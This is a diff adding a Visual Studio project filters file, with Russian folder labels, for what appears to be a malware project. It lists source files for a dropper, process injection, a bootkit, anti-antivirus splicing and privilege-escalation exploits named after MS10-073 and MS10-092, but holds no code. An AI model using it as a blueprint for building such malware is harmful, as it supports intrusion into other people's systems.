@@ -1,0 +1,228 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Файлы исходного кода">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Заголовочные файлы">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Файлы ресурсов">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="com_elevation">
+      <UniqueIdentifier>{4c0afa15-d1c4-47e8-b805-eb9358bf16e6}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="keyboard_ms10_073">
+      <UniqueIdentifier>{837a24da-31f3-46b6-b592-4227a34789bf}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="schtask_ms10_092">
+      <UniqueIdentifier>{b1184263-8601-4abd-9f86-69a9daa1eb65}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="spooler_elevation">
+      <UniqueIdentifier>{5ec40d05-cc34-47ce-a1d7-9221aef0eb5e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Inc">
+      <UniqueIdentifier>{5b9abd0a-dc0e-4f0c-b4f9-fbcd4f3970f7}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="config.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="dropper.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="inject.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="modules.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="protect.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="server.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="cfgini.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="peldr.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="utils.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="x64utils.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="com_elevation\com_elevation.cpp">
+      <Filter>com_elevation</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_073\kernelshell.cpp">
+      <Filter>keyboard_ms10_073</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_073\ms10_073.cpp">
+      <Filter>keyboard_ms10_073</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_092\ms10_092.cpp">
+      <Filter>schtask_ms10_092</Filter>
+    </ClCompile>
+    <ClCompile Include="spooler\antiav.cpp">
+      <Filter>spooler_elevation</Filter>
+    </ClCompile>
+    <ClCompile Include="spooler\spooler.cpp">
+      <Filter>spooler_elevation</Filter>
+    </ClCompile>
+    <ClCompile Include="spooler\splice.cpp">
+      <Filter>spooler_elevation</Filter>
+    </ClCompile>
+    <ClCompile Include="common.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="seccfg.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="bootkit.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+    <ClCompile Include="peimage.cpp">
+      <Filter>Файлы исходного кода</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="config.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="dropper.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="inject.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="modules.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="protect.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="server.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="cfgini.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="ntdll.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="os_structs.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="peldr.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="seccfg.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="stdint.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="utils.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="x64utils.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="com_elevation\com_elevation.h">
+      <Filter>com_elevation</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_073\kernelshell.h">
+      <Filter>keyboard_ms10_073</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_073\ms10_073.h">
+      <Filter>keyboard_ms10_073</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_073\ntoskrnl.h">
+      <Filter>keyboard_ms10_073</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_092\ms10_092.h">
+      <Filter>schtask_ms10_092</Filter>
+    </ClInclude>
+    <ClInclude Include="spooler\antiav.h">
+      <Filter>spooler_elevation</Filter>
+    </ClInclude>
+    <ClInclude Include="spooler\spooler.h">
+      <Filter>spooler_elevation</Filter>
+    </ClInclude>
+    <ClInclude Include="spooler\splice.h">
+      <Filter>spooler_elevation</Filter>
+    </ClInclude>
+    <ClInclude Include="bootkit.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\aplib.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\bklib.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\dbg.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\debug.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\iphdr.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\joiner.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\kdbg.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\kipapi.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\kipioctl.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\listsup.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\macros.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\main.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\ntddkex.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\ntdll.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\rtl.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\util.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="Inc\version.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="fssup.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="install.h">
+      <Filter>Inc</Filter>
+    </ClInclude>
+    <ClInclude Include="peimage.h">
+      <Filter>Заголовочные файлы</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
